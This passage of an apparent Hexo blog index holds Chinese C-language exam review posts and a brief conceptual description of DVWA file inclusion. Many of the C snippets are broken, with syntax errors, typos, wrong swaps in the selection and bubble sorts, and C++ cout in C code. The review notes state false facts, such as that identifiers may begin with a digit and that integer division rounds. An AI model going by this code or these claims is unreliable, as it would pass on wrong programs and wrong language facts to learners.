class="string">&quot;%d&quot;</span>,i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;=%d&quot;</span>,kn(n));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>逆序输出数字</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">while</span>(n&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        (n%<span class="number">10</span>!=<span class="number">0</span>)?<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,n%<span class="number">10</span>):<span class="number">0</span>;</span><br><span class="line">        n/=<span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言期末复习2</title>
      <link href="/2023/12/04/dayc2/"/>
      <url>/2023/12/04/dayc2/</url>
      
        <content type="html"><![CDATA[<h2 id="C语言常见代码汇总">C语言常见代码汇总</h2><h2 id="判断一个年份是闰年">判断一个年份是闰年</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">isleapyear</span><span class="params">(<span class="type">int</span> year)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> ((year%<span class="number">4</span>==<span class="number">0</span>&amp;&amp;year%<span class="number">100</span>!=<span class="number">0</span>)||year%<span class="number">400</span>==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="计算两个数的最大公约数（欧几里得算法）">计算两个数的最大公约数（欧几里得算法）</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">gcd</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (b==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> gcd(b,a%b);<span class="comment">//递归计算最大公约数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="二进制数转换为十进制数">二进制数转换为十进制数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">binarytodecimal</span><span class="params">(<span class="type">int</span> binary)</span>&#123;</span><br><span class="line"><span class="keyword">while</span>(binary&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="type">int</span> reminder=binary%<span class="number">10</span>;<span class="comment">//获取最后一位数字</span></span><br><span class="line">decimal+=reminder*base;<span class="comment">//将最后一位数字乘以对应权重加到结果中</span></span><br><span class="line">binary/=<span class="number">10</span>;<span class="comment">//去掉最后一位数字</span></span><br><span class="line">base*=<span class="number">2</span>;<span class="comment">//每次权重乘以2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> decimal;<span class="comment">//返回对应的十进制数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="斐波那契数列（递归）">斐波那契数列（递归）</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fibonacci</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (n&lt;=<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> n;<span class="comment">//斐波那契数列的前两个数是1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> fibonacci(n<span class="number">-1</span>)+fibonacci(n<span class="number">-2</span>);<span class="comment">//递归调用计算下一个数字</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="将一个十进制转化为二进制">将一个十进制转化为二进制</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">decimaltobinary</span><span class="params">(<span class="type">int</span> decimal)</span>&#123;</span><br><span class="line"><span class="type">int</span> innary[<span class="number">32</span>],index=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(decimal&gt;<span class="number">0</span>)&#123;</span><br><span class="line">binary[index++]=decimal%<span class="number">2</span></span><br><span class="line">decimal/=<span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i-=index-);i&gt;=;i--)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d</span></span><br><span class="line"><span class="string">,binary[i];</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">printf(&quot;</span>\n<span class="string">&quot;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="求一个数组中的最大值和最小值">求一个数组中的最大值和最小值</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">findminmax</span><span class="params">(<span class="type">int</span> arr[],<span class="type">int</span> size)</span>&#123;</span><br><span class="line"><span class="type">int</span> min = arr[<span class="number">0</span>],max = arr[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>;i&lt;size;i++)&#123;</span><br><span class="line"><span class="keyword">if</span> (arr[]&lt;min)&#123;</span><br><span class="line">min = arr[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (arr[i]&gt;max)&#123;</span><br><span class="line">max=arr[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实现简单的计算器（±x-）">实现简单的计算器（±x/）</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">add</span> <span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">subtract</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> a-b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">multiply</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> a*b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">divide</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (b!=<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">return</span>(<span class="type">float</span>)a/b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">char</span> expr[<span class="number">100</span>];</span><br><span class="line"><span class="type">int</span> mun1,num2;</span><br><span class="line"><span class="type">char</span> op;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入表达式&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,expr);</span><br><span class="line"><span class="built_in">scanf</span>(expr<span class="string">&quot;%d %c %d&quot;</span>,&amp;num1,&amp;op,&amp;num2);</span><br><span class="line"><span class="keyword">switch</span>(op)&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d+%d=%d\n&quot;</span>,num1,num2,add(num1,num2));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d-d=%d\n&quot;</span>,num1,num2,subtract(num1,num2));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d*%d=%d\n&quot;</span>num1,num2, multiply(num1,num2));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d/%d=%.2f\n&quot;</span>,num1,num2,divide(num1,num2);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;非法运算符\n);</span></span><br><span class="line"><span class="string">break;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="冒泡排序学生总成绩">冒泡排序学生总成绩</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_N 100</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span>&#123;</span></span><br><span class="line"><span class="type">char</span> name[<span class="number">20</span>];</span><br><span class="line"><span class="type">char</span> id[<span class="number">10</span>];</span><br><span class="line"><span class="type">float</span> ma,ch,total;</span><br><span class="line">&#125; stu[MAX_N];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="type">int</span> n=<span class="number">4</span>,i,j;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;请输入学生人数n=\n&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;请输入学生信息:\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s %s %f %f&quot;</span>, &amp;stu[i].name,&amp;stu[i].id,&amp;stu[i].ma,&amp;stu[i].ch);</span><br><span class="line">stu[i].total=(stu[i].ma+stu[i].ch)/<span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;n<span class="number">-1</span>-i;j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(stu[j].total&gt;stu[j+<span class="number">1</span>].total)&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span> <span class="title">mid</span>;</span></span><br><span class="line">mid=stu[j];</span><br><span class="line">stu[j]=stu[j+<span class="number">1</span>];</span><br><span class="line">stu[j+<span class="number">1</span>]=mid;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++) <span class="built_in">printf</span>(<span class="string">&quot;%s %s %.2f\n&quot;</span>, stu[i].name,stu[i].id,stu[i].total);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言期末复习1</title>
      <link href="/2023/12/02/dayc1/"/>
      <url>/2023/12/02/dayc1/</url>
      
        <content type="html"><![CDATA[<h1>c语言期末复习辅助</h1><h2 id="知识点总复习">知识点总复习</h2><p>1.程序结构是三种，顺序结构，循环结构，选择结构，</p><p>2.读取程序都需要在main()函数入口，然后从上往下读，直到主函数结束。</p><p>3.计算机中的数据是以二进制的形式保存的，存放的位置就是他的地址，地址是十六进制的</p><p>4.运算符的优先级：单目运算符&gt;双目运算符&gt;三目运算符，算术运算符&gt;关系运算符&gt;逻辑运算符&gt;赋值运算符,逗号运算符的级别最低。</p><h2 id="常见基础知识">常见基础知识</h2><h3 id="普遍">普遍</h3><p>1.标识符必须有字母数字下划线组成，并且第一个字符必须为字母或者数字。</p><p>2.不能用main define sacnf等作为标识符</p><p>3.c语言的八进制要以0开头，十六进制要以0x开头。</p><p>4.小数的合法写法：1.0可以写成1 0.1可以写成.1</p><p>5.e前e后必须有数，e后必为整数。</p><p>6.long int x 表示x是长类型 unsignde int x 标识x是无符号类型</p><h3 id="表达式：">表达式：</h3><p>1.算数表达式：</p><p>”/“两边都是整形，那么结果就是一个整数（四舍五入）</p><p>”/“如果有一边为小数，那么结果就是小数</p><p>”%“注意是取余数，两边的要求是整数。</p><p>2.赋值表达式</p><p>不能连续赋值</p><p>赋值的左边只能是一个表达式</p><p>3.自加表达式</p><p>++在前先加后用，，++在后先用后加（–类似0</p><p>4.逗号表达式</p><p>优先级别最低</p><p>5.三种取整丢小数的情况</p><p>int a=1.6;</p><p>(int)a;</p><p>1/2;3/2</p><p>6.定义宏常量：#define 标识符 字符串加分号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define PI 3.14159</span><br><span class="line">定义pi</span><br></pre></td></tr></table></figure><p>定义const常量： const 数据类型 标识符字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const int MAX_VALUE = 100;</span><br><span class="line">在这个例子中，MAX_VALUE就是一个const常量，它的数据类型为int，值为100。在程序中可以直接使用MAX_VALUE来代表这个值，而不需要担心其被修改。</span><br></pre></td></tr></table></figure><h3 id="字符">字符</h3><h4 id="重要：大写字母和小写字母转换的方法">重要：大写字母和小写字母转换的方法</h4><p>‘A’+32=‘a’ 相互之间一般差32</p><p>转移字符（重要）</p><p>\n换行</p><p>\0空字符</p><p>注：字符型（char)和整数(int)是近亲:有着相似的地方</p><p>char a=65</p><p>printf(“%c”,a);得到a</p><p>printf(“%d”,A);得到65</p><h4 id="键盘输入和屏幕输出：">键盘输入和屏幕输出：</h4><p>getchar()用于字符输入</p><p>putchar（）用于字符输出</p><p>printf（）用于输出数据</p><p>scanf()用于输入数据</p><h3 id="选择结构">选择结构</h3><p>1.if（）语句后面不加分号</p><p>2.单支if() 双支if else  多分支if if else() else</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if ()&#123;</span><br><span class="line">......;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.switch语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">switch()&#123;</span><br><span class="line">case 1:.....;</span><br><span class="line">break</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一般需要break使其跳出循环，否则将会按照顺序往下继续进行</p><h3 id="循环结构">循环结构</h3><p>1.while</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">while()&#123;</span><br><span class="line">......;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行过程：</p><p>1.计算循环控制表达式的值;<br>2.如果循环表达式的值为真，那么就执行循环体中的语句，并返回while重新开始判断<br>3.如果循环控制表达式的值为假，就退出循环，执行循环体后面的语句。</p><p>2.do-while</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">do</span><br><span class="line">&#123;</span><br><span class="line">.....;</span><br><span class="line">&#125;while();</span><br></pre></td></tr></table></figure><p>执行过程：</p><p>1.执行循环体中的语句;<br>2.计算循环控制表达式的值;<br>3.如果循环控制表达式的值为真，那么返回继续执行<br>4.如果循环控制表达式的值为假，就退出循环，执行循环体后面的语句。</p><p>3.for</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for(初始化表达式;循环控制表达试;增值表达式)</span><br><span class="line">&#123;</span><br><span class="line">语句序列</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4.注意：使用合适的循环结构，①如果循环次数已知，计数控制的循环，用for语句。②如果循环次数未知，条件控制的循环，用while语句③如果循环体至少要执行一次，用do–while语句。</p><h3 id="数组">数组</h3><h4 id="定义并初始化数组">定义并初始化数组</h4><p>存放五个字符：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char a[5]=&#123;&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;,&#x27;e&#x27;&#125;;</span><br></pre></td></tr></table></figure><p>存放一个字符：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char a[5]=&quot;abcd&quot;;</span><br></pre></td></tr></table></figure><p>二维数组初始化：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char a[3][4]=&#123;&quot;abc&quot;,&quot;cv&quot;,&quot;rty&quot;&#125;;</span><br></pre></td></tr></table></figure><h4 id="输入字符串">输入字符串</h4><p>1.scanf(“%s”,字符串名称)；</p><p>scanf(“%s%s%s”,s1,s2,s3);</p><p>2.get</p><p>get(字符串名称);</p><p>只能输入一个字符串，从光标开始到换行符，也就是说读入的是一整行。例如输入Hello World！获取的是Hello World!</p><h4 id="输出字符串">输出字符串</h4><p>1.printf(“%s”,字符串名称)；</p><p>输出项只能是字符串的名称，不能是数组元素。输出字符串不包括字符串结束标识符\0</p><p>2.put</p><p>puts(字符串名称)；</p><p>puts输出一个字符串和一个换行符</p><h3 id="函数">函数</h3><p>函数，函数对形参做处理，结果以return语句形式返回。对函数定义时要加函数类型和实参类型，但函数调用时实参不带类型。</p><h2 id="补充：常见内容的运用">补充：常见内容的运用</h2><h3 id="交换排序">交换排序</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i,j,temp,n,a[<span class="number">1000</span>];</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;i++)&#123;</span><br><span class="line"><span class="keyword">for</span> (j=i+<span class="number">1</span>;j&lt;n;j++)&#123;</span><br><span class="line"><span class="keyword">if</span> (a[j]&gt;a[i])&#123;</span><br><span class="line">temp=a[j];</span><br><span class="line">a[j]=a[i];</span><br><span class="line">a[i]=temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="选择排序">选择排序</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i,j,k,temp;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;i++)&#123;</span><br><span class="line">k=<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span>(j=i+<span class="number">1</span>;j&lt;n;j++)&#123;</span><br><span class="line"><span class="keyword">if</span> (a[j]&lt;a[k])&#123;</span><br><span class="line">k=j</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (k!=i)&#123;</span><br><span class="line">temp=a[k];</span><br><span class="line">a[k]=a[i];</span><br><span class="line">a[k]=temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="插入排序">插入排序</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i,l,temp,a[num];</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;num;i++)&#123;</span><br><span class="line">l=i<span class="number">-1</span>;</span><br><span class="line">temp=a[i];</span><br><span class="line"><span class="keyword">while</span>(l&gt;=<span class="number">0</span>&amp;&amp;a[l]&gt;temp)&#123;</span><br><span class="line">a[l+<span class="number">1</span>]=a[l];</span><br><span class="line">l--;</span><br><span class="line">a[l+<span class="number">1</span>]=temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="冒泡排序">冒泡排序</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">bubble_sort</span><span class="params">(<span class="type">int</span> arr[],<span class="type">int</span> size)</span>&#123;</span><br><span class="line"><span class="type">int</span> i,j,temp;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;size<span class="number">-1</span>;i++)&#123;</span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (j=<span class="number">0</span>;j&lt;size<span class="number">-1</span>;j++)&#123;</span><br><span class="line"><span class="keyword">if</span> (arr[j]&gt;arr[j+<span class="number">1</span>])&#123;</span><br><span class="line">tmep=arr[j];</span><br><span class="line">arr[j+<span class="number">1</span>]=arr[j];</span><br><span class="line">arr[j+<span class="number">1</span>]=temp;</span><br><span class="line">count=<span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (count==<span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="查找">查找</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> low,high,a[n],mid,temp;</span><br><span class="line">low=<span class="number">0</span>,high=n<span class="number">-1</span>,mid=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(low&lt;=high)&#123;</span><br><span class="line">mid=(low+high)/<span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> (a[mid]&gt;temp)&#123;</span><br><span class="line">high=mid<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (a[mid]&lt;temp)&#123;</span><br><span class="line">low=mid+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;a[mid]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;not found!&quot;</span>&lt;&lt;<span class="built_in">endl</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA FI</title>
      <link href="/2023/11/30/day77777/"/>
      <url>/2023/11/30/day77777/</url>
      
        <content type="html"><![CDATA[<h1>File Inclusion 文件包含</h1><h2 id="简介">简介</h2><p>文件包含漏洞：即File  Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。服务器通过php的特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严，从而可以去包含一个恶意文件，而我们可以构造这个恶意文件来达到自己的目的。</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA CSRF</title>
      <link href="/2023/11/28/day666/"/>
      <url>/2023/11/28/day666/</url>
      
